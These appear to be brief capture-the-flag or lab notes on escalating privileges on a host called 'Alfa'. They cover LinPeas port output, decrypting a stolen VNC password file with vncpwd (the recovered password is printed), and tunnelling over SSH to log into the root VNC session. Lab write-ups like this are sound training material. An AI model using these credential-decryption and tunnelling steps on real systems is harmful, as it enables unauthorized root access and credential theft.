# LinPeas

1. VNC Service: 5901

```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:65111           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 ::1:5901                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::65111                :::*                    LISTEN      - 
```



# try to dump vnc process


root       477  0.0  3.2 128960 48416 ?        S    may23   0:00 /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfb


--> not working but i can decrypt the vnc pass:

https://book.hacktricks.xyz/pentesting/pentesting-vnc#decrypting-vnc-password

Tool from here:
https://github.com/jeroennijhof/vncpwd

thomas@Alfa:~$ chmod +x vncpwd1 
thomas@Alfa:~$ ./vncpwd1 .remote_secret
Password: k!LL3rSs
thomas@Alfa:~$ 

But also dont need to decrypt, just copy the file to local and login after tunneling

Tunnel 5901 to localhost:

```bash
ssh thomas@alfa.fritz.box -p 65111 -L 5901:localhost:5901
```

![[Pasted image 20210524011829.png]]

Start VNC Viewer from localhost
```bash
vncviewer -passwd .remote_secret 127.0.0.1::5901
```



![[Pasted image 20210524011506.png]]
